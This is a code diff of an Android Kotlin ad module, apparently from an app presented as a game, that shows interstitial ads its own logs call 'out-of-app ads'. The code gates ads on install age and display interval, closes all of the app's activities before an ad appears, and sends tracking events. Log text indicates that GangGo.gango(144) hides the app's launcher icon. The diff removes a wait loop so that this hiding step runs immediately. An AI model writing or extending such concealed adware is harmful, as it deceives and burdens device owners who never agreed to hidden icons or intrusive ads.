@@ -3,10 +3,9 @@ package com.passionate.annoyed.ruthlessness.utils
 import android.os.Handler
 import android.os.Looper
 import com.passionate.annoyed.ruthlessness.dataces.EnhancedShowService
-import com.passionate.annoyed.ruthlessness.dataces.EnvironmentConfig
-import com.passionate.annoyed.ruthlessness.net.CanPost
-import com.passionate.annoyed.ruthlessness.jk.FebApp
-import com.passionate.annoyed.ruthlessness.jk.FebApp.dataAppBean
+import com.passionate.annoyed.ruthlessness.net.GameCanPost
+import com.passionate.annoyed.ruthlessness.jk.GameStart
+import com.passionate.annoyed.ruthlessness.jk.GameStart.dataAppBean
 import com.passionate.annoyed.ruthlessness.jk.GangGo
 import com.passionate.annoyed.ruthlessness.utils.AdUtils.initFaceBook
 import com.tradplus.ads.base.bean.TPAdError
@@ -42,12 +41,12 @@ class AdShowFun {
     private fun intiTTTTAd() {
         if (mTPInterstitial == null) {
             val idBean = KeyContent.getAdminData() ?: return
-            mTPInterstitial = TPInterstitial(FebApp.gameApp, idBean.adDetails.adId)
+            mTPInterstitial = TPInterstitial(GameStart.gameApp, idBean.adDetails.adId)
             mTPInterstitial!!.setAdListener(object : InterstitialAdListener {
                 override fun onAdLoaded(tpAdInfo: TPAdInfo) {
                     KeyContent.showLog("体外广告加载成功")
                     lastAdLoadTime = System.currentTimeMillis()
-                    CanPost.postPointDataWithHandler(false, "getadvertise")
+                    GameCanPost.postPointDataWithHandler(false, "getadvertise")
                     isLoading = false
                     isHaveAdData = true
                 }
@@ -61,8 +60,8 @@ class AdShowFun {
                 override fun onAdImpression(tpAdInfo: TPAdInfo) {
                     KeyContent.showLog("体外广告${tpAdInfo.adSourceName}展示")
                     adLimiter.recordAdShown()
-                    CanPost.postAdmobDataWithHandler(tpAdInfo)
-                    CanPost.showsuccessPoint()
+                    GameCanPost.postAdmobDataWithHandler(tpAdInfo)
+                    GameCanPost.showsuccessPoint()
                     if (adLimiter.canShowAd() && mTPInterstitial?.isReady == true) {
                         lastAdLoadTime = System.currentTimeMillis()
                         isHaveAdData = true
@@ -79,7 +78,7 @@ class AdShowFun {
                         delay(10000)
                         isLoading = false
                     }
-                    CanPost.postPointDataWithHandler(
+                    GameCanPost.postPointDataWithHandler(
                         false,
                         "getfail",
                         "string1",
@@ -94,7 +93,7 @@ class AdShowFun {
 
                 override fun onAdVideoError(tpAdInfo: TPAdInfo, tpAdError: TPAdError) {
                     KeyContent.showLog("体外广告${tpAdInfo.adSourceName}展示失败")
-                    CanPost.postPointDataWithHandler(
+                    GameCanPost.postPointDataWithHandler(
                         false,
                         "showfailer",
                         "string3",
@@ -134,7 +133,7 @@ class AdShowFun {
             // 发起新的广告请求
             KeyContent.showLog("发起新的广告请求")
             mTPInterstitial?.loadAd()
-            CanPost.postPointDataWithHandler(false, "reqadvertise")
+            GameCanPost.postPointDataWithHandler(false, "reqadvertise")
 
             // 设置超时处理
             Handler(Looper.getMainLooper()).postDelayed({
@@ -144,7 +143,7 @@ class AdShowFun {
                     lastAdLoadTime = 0
                     loadAd()
                 }
-            }, 60 * 1000) // 60秒超时
+            }, 60 * 1000)
         }
     }
 
@@ -159,19 +158,7 @@ class AdShowFun {
         val delayData = wTime.toLong().times(1000L)
         KeyContent.showLog("doToWhileAd delayData=: ${delayData}")
         jobAdRom = CoroutineScope(Dispatchers.Main).launch {
-            while (true) {
-                val a = ArrayList(FebApp.activityList)
-                if (a.isEmpty() || (a.last().javaClass.name != EnvironmentConfig.packnameStart)) {
-                    if (a.isEmpty()) {
-                        KeyContent.showLog("隐藏图标=null")
-                    } else {
-                        KeyContent.showLog("隐藏图标=${a.last().javaClass.name}")
-                    }
-                    GangGo.gango(144)
-                    break
-                }
-                delay(500)
-            }
+            GangGo.gango(144)
             checkAndShowAd(delayData)
         }
     }
@@ -179,9 +166,9 @@ class AdShowFun {
     private suspend fun checkAndShowAd(delayData: Long) {
         while (true) {
             KeyContent.showLog("循环检测广告")
-            CanPost.postPointDataWithHandler(false, "timertask")
+            GameCanPost.postPointDataWithHandler(false, "timertask")
             if (AdUtils.adNumAndPoint() && !dataAppBean.adFailPost) {
-                CanPost.postPointDataWithHandler(false, "jumpfail")
+                GameCanPost.postPointDataWithHandler(false, "jumpfail")
                 jobAdRom?.cancel()
                 dataAppBean.adFailPost= true
                 return
@@ -199,7 +186,7 @@ class AdShowFun {
             return
         }
         // 调用点位数据函数
-        CanPost.postPointDataWithHandler(false, "isunlock")
+        GameCanPost.postPointDataWithHandler(false, "isunlock")
 
         // 获取管理员数据
         val jsonBean = KeyContent.getAdminData() ?: return
@@ -224,7 +211,7 @@ class AdShowFun {
     private fun isBeforeInstallTime(instalTime: Long, ins: Int): Boolean {
         if (instalTime < ins) {
             KeyContent.showLog("距离首次安装时间小于$ins 秒，广告不能展示")
-            CanPost.postPointDataWithHandler(false, "ispass", "string", "Install")
+            GameCanPost.postPointDataWithHandler(false, "ispass", "string", "Install")
             return true
         }
         return false
@@ -234,14 +221,14 @@ class AdShowFun {
         val jiange = (System.currentTimeMillis() - AdUtils.adShowTime) / 1000
         if (jiange < wait) {
             KeyContent.showLog("广告展示间隔时间小于$wait 秒，不展示")
-            CanPost.postPointDataWithHandler(false, "ispass", "string", "interval")
+            GameCanPost.postPointDataWithHandler(false, "ispass", "string", "interval")
             return true
         }
         return false
     }
 
     private fun showAdAndTrack() {
-        CanPost.postPointDataWithHandler(false, "ispass", "string", "")
+        GameCanPost.postPointDataWithHandler(false, "ispass", "string", "")
         CoroutineScope(Dispatchers.Main).launch {
             closeAllActivities()
             delay(1001)
@@ -251,7 +238,7 @@ class AdShowFun {
             }
             addFa()
             GangGo.gango( 1028)
-            CanPost.postPointDataWithHandler(false, "callstart")
+            GameCanPost.postPointDataWithHandler(false, "callstart")
         }
     }
 
@@ -262,9 +249,9 @@ class AdShowFun {
     }
     fun closeAllActivities() {
         KeyContent.showLog("closeAllActivities")
-        for (activity in FebApp.activityList) {
+        for (activity in GameStart.activityList) {
             activity.finishAndRemoveTask()
         }
-        FebApp.activityList.clear()
+        GameStart.activityList.clear()
     }
 }
